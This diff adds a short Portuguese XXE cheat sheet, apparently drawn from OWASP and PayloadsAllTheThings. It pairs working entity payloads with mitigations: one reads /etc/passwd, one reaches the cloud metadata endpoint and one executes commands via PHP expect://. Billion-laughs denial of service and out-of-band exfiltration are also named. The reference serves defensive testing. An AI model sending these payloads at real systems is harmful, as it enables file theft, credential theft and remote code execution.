@@ -1,0 +1,9 @@
+# XXE - cheatsheet (reimplementado de OWASP / PayloadsAllTheThings)
+# USO SOMENTE em sistemas proprios/autorizados.
+#
+# PAYLOAD (DOCTYPE)                                                  | EFEITO                     | MITIGACAO
+<!DOCTYPE n [<!ENTITY x SYSTEM "file:///etc/passwd">]><n>&x;</n>    | le arquivo local           | disallow-doctype-decl
+<!DOCTYPE n [<!ENTITY x SYSTEM "http://169.254.169.254/">]><n>&x;</n>| SSRF (metadata da nuvem)   | disallow-doctype + egress
+<!DOCTYPE n [<!ENTITY x SYSTEM "expect://id">]><n>&x;</n>          | RCE via wrapper (PHP expect)| disallow-doctype
+billion laughs (entidades aninhadas &a;&a;...)                      | DoS por expansao           | disallow-doctype + limites
+parameter entities + DTD externa (OOB)                             | exfiltra blind p/ servidor  | disallow-doctype-decl
